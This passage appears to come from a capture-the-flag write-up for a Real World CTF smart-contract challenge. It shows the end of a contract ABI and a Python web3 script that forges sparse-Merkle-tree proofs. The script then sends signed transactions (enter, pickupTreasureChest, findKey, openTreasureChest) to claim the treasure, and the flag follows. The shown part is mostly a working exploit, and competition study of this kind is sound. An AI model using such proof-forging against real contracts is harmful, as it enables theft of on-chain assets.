        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "bytes32[]",
                "name": "_proofs",
                "type": "bytes32[]"
            }
        ],
        "name": "leave",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "_from",
                "type": "address"
            }
        ],
        "name": "FindKey",
        "type": "event"
    },
    {
        "inputs": [],
        "name": "openTreasureChest",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "_from",
                "type": "address"
            }
        ],
        "name": "OpenTreasureChest",
        "type": "event"
    },
    {
        "inputs": [
            {
                "internalType": "bytes32[]",
                "name": "_proofs",
                "type": "bytes32[]"
            }
        ],
        "name": "pickupTreasureChest",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "_from",
                "type": "address"
            }
        ],
        "name": "PickupTreasureChest",
        "type": "event"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "name": "haveKey",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "name": "haveTreasureChest",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "root",
        "outputs": [
            {
                "internalType": "bytes32",
                "name": "",
                "type": "bytes32"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "smtMode",
        "outputs": [
            {
                "internalType": "enum SMT.Mode",
                "name": "",
                "type": "uint8"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "solved",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]"""

acct = w3.eth.account.from_key('your_private_key')
contract_address='your_want_attack_contract_address'
contract=w3.eth.contract(abi=abi,address=contract_address)

def to_bytes32(a: int) -> bytes:
  return a.to_bytes(32, 'big')

def abi_encode(a: int, b: int):
  a = to_bytes32(a)
  b = to_bytes32(b)
  return a + b

def merge(l, r):
  if l == 0:
    return r
  if r == 0:
    return l
  return Web3.toInt(Web3.keccak(abi_encode(l, r)))

class Tree:
  def __init__(self, value: int):
    self.value = value
  def build_proofs(self):
    raise NotImplementedError
  def has_abnormal(self):
    raise NotImplementedError

class TreeElem(Tree):
  def __init__(self, path: int, normal: bool = True):
    self.path = path
    self.normal = normal
    value = Web3.toInt(Web3.keccak(abi_encode(path, 1)))
    super().__init__(value)

  def build_proofs(self):
    assert self.has_abnormal()
    return [0x4c]

  def has_abnormal(self):
    return not self.normal
  
class TreeBranch(Tree):
  def __init__(self, nbit: int, left: Tree, right: Tree):
    self.nbit = nbit
    self.left = left
    self.right = right
    value = merge(left.value, right.value)
    super().__init__(value)

  def build_proofs(self):
    if self.left.has_abnormal():
      return self.left.build_proofs() + [0x50, self.nbit, self.right.value]
    elif self.right.has_abnormal():
      return self.right.build_proofs() + [0x50, self.nbit, self.left.value]
    else:
      raise RuntimeError

  def has_abnormal(self):
      return self.left.has_abnormal() or self.right.has_abnormal()

def get_root(vals, is_normal, nbit=160) -> Tree:
  assert len(vals) > 0
  if len(vals) == 1:
    return TreeElem(vals[0], is_normal(vals[0]))
  lvals = []
  rvals = []
  for x in vals:
    if (x >> (nbit-1)) & 1:
      rvals.append(x)
    else:
      lvals.append(x)
  if len(lvals) == 0:
    return get_root(rvals, is_normal, nbit-1)
  if len(rvals) == 0:
    return get_root(lvals, is_normal, nbit-1)
  l = get_root(lvals, is_normal, nbit-1)
  r = get_root(rvals, is_normal, nbit-1)
  return TreeBranch(nbit-1, l, r)

def remove_node(tree: Tree, path: int) -> Tree:
  if isinstance(tree, TreeElem):
    return TreeElem(path, tree.normal)
  if isinstance(tree, TreeBranch):
    if (path >> tree.nbit) & 1:
      t = TreeBranch(tree.nbit, tree.left, remove_node(tree.right, path))
    else:
      t = TreeBranch(tree.nbit, remove_node(tree.left, path), tree.right)
    t.value = tree.value
    return t

def emulate(proofs: List[int], leaves: List[Tuple[int,int]]) -> int:
  stack_keys = []
  stack_values = []
  i = 0
  j = 0
  while i < len(proofs):
    if proofs[i] == 0x4c:
      stack_keys.append(leaves[j][0])
      stack_values.append(leaves[j][1])
      j += 1
      i += 1
    elif proofs[i] == 0x50:
      height = proofs[i+1]
      proof = proofs[i+2]
      key = stack_keys.pop()
      value = stack_values.pop()
      if (key >> height) & 1:
        stack_values.append(merge(proof, value))
      else:
        stack_values.append(merge(value, proof))
      stack_keys.append(key >> (height+1) << (height+1))
      i += 3
    elif proofs[i] == 0x48:
      height = proofs[i+1]
      k1 = stack_keys.pop()
      k2 = stack_keys.pop()
      v1 = stack_values.pop()
      v2 = stack_values.pop()
      aset = (k2 >> height) & 1
      bset = (k1 >> height) & 1
      stack_keys.append(k1 >> (height+1) << (height+1))
      assert aset != bset
      if aset:
        stack_values.append(merge(v1, v2))
      else:
        stack_values.append(merge(v2, v1))
      i += 2
    else:
      raise ValueError
  assert len(stack_keys) == 1
  assert j == len(leaves)
  return stack_values[0]

hunters = [
  0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e,
  0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45,
  0x6B175474E89094C44Da98b954EedeAC495271d0F,
  0x6B3595068778DD592e39A122f4f5a5cF09C90fE2,
  0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B,
  0xc00e94Cb662C3520282E6f5717214004A7f26888,
  0xD533a949740bb3306d119CC777fa900bA034cd52,
  0xdAC17F958D2ee523a2206206994597C13D831ec7,
]

def solve(deployer_addr: int):
  tree = get_root(hunters, lambda _: True)
  index = bisect.bisect_left(hunters, deployer_addr)
  new_values = hunters[:]
  new_values.insert(index, deployer_addr)
  new_tree = get_root(new_values, lambda x: x != deployer_addr)
  proofs = new_tree.build_proofs()
  assert emulate(proofs, [(deployer_addr, 0)]) == tree.value
  assert emulate(proofs, [(deployer_addr, Web3.toInt(Web3.keccak(abi_encode(deployer_addr, 1))))]) == new_tree.value

  one_pos = 0
  while ((deployer_addr >> one_pos) & 1) == 0:
    one_pos += 1
  zero_pos = 0
  while ((deployer_addr >> zero_pos) & 1) == 1:
    zero_pos += 1

  proofs2 = [0x4c, 0x50, one_pos, new_tree.left.value, 0x50, zero_pos, new_tree.right.value]
  assert emulate(proofs2, [(deployer_addr, 0)]) == new_tree.value

  proofs = list(map(to_bytes32, proofs))
  proofs2 = list(map(to_bytes32, proofs2))

#   print("enter", proofs)
#   print("pickupTreasureChest", proofs)
#   print("findKey", proofs2)

  return proofs, proofs2
 
proofs,proofs2=solve(acct.address)
enter_txn = contract.functions.enter(proofs).buildTransaction({
'nonce': w3.eth.getTransactionCount(acct.address),
'gas': 300000,
'gasPrice': w3.eth.gasPrice
}) 
signed = acct.signTransaction(enter_txn)
tx_id = w3.eth.sendRawTransaction(signed.rawTransaction) 
print(tx_id.hex())

pickupTreasureChest_txn = contract.functions.pickupTreasureChest(proofs).buildTransaction({
'nonce': w3.eth.getTransactionCount(acct.address),
'gas': 300000,
'gasPrice': w3.eth.gasPrice
}) 
signed = acct.signTransaction(pickupTreasureChest_txn)
tx_id = w3.eth.sendRawTransaction(signed.rawTransaction) 
print(tx_id.hex())

findKey_txn = contract.functions.findKey(proofs2).buildTransaction({
'nonce': w3.eth.getTransactionCount(acct.address),
'gas': 300000,
'gasPrice': w3.eth.gasPrice
}) 
signed = acct.signTransaction(findKey_txn) 
tx_id = w3.eth.sendRawTransaction(signed.rawTransaction) 
print(tx_id.hex())

openTreasureChest_txn = contract.functions.openTreasureChest().buildTransaction({
'nonce': w3.eth.getTransactionCount(acct.address),
'gas': 300000,
'gasPrice': w3.eth.gasPrice
})
signed = acct.signTransaction(openTreasureChest_txn)
tx_id = w3.eth.sendRawTransaction(signed.rawTransaction) 
print(tx_id.hex())
rwctf{Super_Hunters_Conquer_Together}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/2-1643075761.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/1-1643075762.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/9-1643075762.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/1-1643075763.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/5-1643075763.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/7-1643075764.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/4-1643075764.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/1-1643075765.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/7-1643075765.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/4-1643075765.png)